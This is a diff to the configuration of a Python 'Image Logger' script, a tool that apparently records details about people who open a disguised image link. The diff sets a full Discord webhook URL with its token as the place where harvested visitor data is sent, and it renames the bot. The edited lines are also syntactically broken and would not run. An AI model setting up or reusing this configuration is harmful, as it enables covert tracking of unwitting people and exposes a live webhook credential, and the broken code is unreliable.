@@ -12,13 +12,13 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": webhooks/https://discord.com/api/webhooks/1410660511074488421/yAsvvH_SVbpG_m7PFgNuIoxHqb6Sl2msNZMm0VcJeqlqOEmhgvp-008enb-djII8pOij
+    "webhook":https://discord.com/api/webhooks/1410660511074488421/yAsvvH_SVbpG_m7PFgNuIoxHqb6Sl2msNZMm0VcJeqlqOEmhgvp-008enb-djII8pOij
     "image":https://wallpaperaccess.com/full/3312054.jpg  # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": spidey bot # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
